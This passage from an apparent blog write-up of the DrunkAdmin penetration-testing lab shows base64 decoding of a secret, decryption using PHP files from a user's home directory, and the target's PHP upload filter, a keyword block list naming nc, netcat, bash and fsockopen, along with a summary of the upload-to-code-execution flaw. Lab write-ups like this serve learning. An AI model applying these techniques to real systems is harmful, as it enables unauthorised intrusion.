-<a href="&#109;&#x61;&#x69;&#x6c;&#116;&#111;&#x3a;&#97;&#110;&#101;&#x73;&#x74;&#x69;&#x73;&#x40;&#98;&#101;&#x63;&#x68;&#x74;&#115;&#x6f;&#117;&#100;&#x69;&#x73;&#x2e;&#x63;&#111;&#109;">&#x61;&#110;&#x65;&#x73;&#x74;&#x69;&#x73;&#64;&#x62;&#101;&#x63;&#104;&#x74;&#115;&#111;&#117;&#100;&#105;&#x73;&#46;&#99;&#x6f;&#x6d;</a>
-```</p>
-
-<p>All right, found the right one! I tried to decode that string but didn&rsquo;t get any intelligible output. This time though, all those PHP files that I found in bob&rsquo;s home directory would come in handy! There is a <em>public_html</em> file in bob&rsquo;s home with files that encrypt and decrypt passwords.</p>
-
-<p><code>plain
-ls /home/bob/public_html
-encrypt.php
-include
-index.php
-</code></p>
-
-<p>I copied the contents of the files to the <em>/var/www/images</em> directory and then I checked that index.php file:</p>
-
-<p><img class="center" src="/images/pentest/drunkadmin/secret.png" title="&lsquo;secret&rsquo; &lsquo;secret decryption&rsquo;" ></p>
-
-<p>But when I gave it the string <code>TGglMUxecjJDSDclN1Ej</code> I got garbage. Now, one of the things I tried before was to base64 decode the string. The output I got was <code>Lh%1L<sup>r2CH7</sup>%7Q#</code>, which didn&rsquo;t really help. Since I couldn&rsquo;t decrypt the secret with the form either, I thought to double check what kind of encoding it might use. And because I was thinking base64 but not sure, I inspired myself from a <a href="https://stackoverflow.com/questions/11656115/decode-python-base64-string">Stack Overflow post</a> to check if the string really is base64 in Python:</p>
-
-<p>``` python</p>
-
-<p>import base64
-import binascii</p>
-
-<p>testme = raw_input(&ldquo;Enter string to check if base64: &rdquo;)</p>
-
-<p>try:</p>
-
-<pre><code>base64.decodestring(testme)
-print base64.decodestring(testme)
-</code></pre>
-
-<p>except binascii.Error:</p>
-
-<pre><code>print "[x] Sorry, this isn't base64"
-</code></pre>
-
-<p>```</p>
-
-<p>And the the script did return the same output that I had decoded earlier: <code>Lh%1L<sup>r2CH7</sup>%7Q#</code>. So this time, I tried to enter this string in the decrypt form..and the message was revealed!</p>
-
-<p><code>Alice, prepare for a kinky night. Meet me at &lsquo;35.517286&rsquo; &lsquo;24.017637&rsquo;</code></p>
-
-<p>Yes! The message was decrypted and challenge completed! I was curious though and looked at the coordinates in Google Maps. It seems that Bob and Alice&rsquo;s chosen place of fun is a location in Greece:</p>
-
-<p><img class="center" src="/images/pentest/drunkadmin/location.png" title="&lsquo;meeting location&rsquo; &lsquo;secret location&rsquo;" ></p>
-
-<p>Before wrapping up, do you remember the upload filter that caught the malicious uploads and gave a naughty message? I took a peek at it and here&rsquo;s the filter part:</p>
-
-<p>``` php
-if(isset($_POST[&lsquo;Submit&rsquo;]) &amp;&amp; !$errors) {</p>
-
-<pre><code>$file = file_get_contents("./images/$image_name");
-if( strpos($file,"perl") ||
-strpos($file,"bash") ||
-strpos($file,"sh -c") ||
-strpos($file,"python") ||
-strpos($file,"nc ") ||
-strpos($file,"netcat") ||
-strpos($file,"base64") ||
-strpos($file,"ruby") ||
-strpos($file,"fsockopen") ||
-strpos($file,"xterm") ||
-strpos($file,"gcc") ||
-strpos($file,'$_GET') ||
-strpos($file,'$_POST') ||
-strpos($file,'$_SERVER') ||
-strpos($file,'$_FILES') ||
-strpos($file,'$_COOKIE') )
-{ 
-echo "&lt;h1&gt;Ohhh you are naughty!&lt;/h1&gt;"; 
-exec("rm ./images/$image_name");
-die;
-}
-</code></pre>
-
-<p>```</p>
-
-<p>Nice twist on this file upload vulnerability!</p>
-
-<h1>Report</h1>
-
-<p>This was another interesting challenge that seemed straightforward at the beginning but required more trial and error to solve. The steps that led to the exploitation were:</p>
-
-<ul>
-<li><p>server was vulnerable to unrestricted file upload that led to remote code execution</p></li>
-<li><p>the filter that tried to protect against malicious code didn&rsquo;t stop everything that an attacker could use</p></li>
-<li><p>the hidden file was not so hidden in the <em>/var/www</em> directory</p></li>
-<li><p>files in Bob&rsquo;s home folder were readable, allowing the decryption of the secret message</p></li>
-</ul>
-
-
-<p>The key takeaway for me was to start simple and build from there when testing stuff. I would have saved so much time if I had tried a simple PHP code execution test, instead of throwing reverse shells and scratching my head when it didn&rsquo;t work</p>
-
-<p>And today, instead of a cookie, I leave here the picture that gets displayed when you go to a non existent page on the server:</p>
-
-<p><img class="center" src="/images/pentest/drunkadmin/think.png" title="&lsquo;think&rsquo; &lsquo;hmm&rsquo;" ></p>
 ]]></content>
   </entry>
   
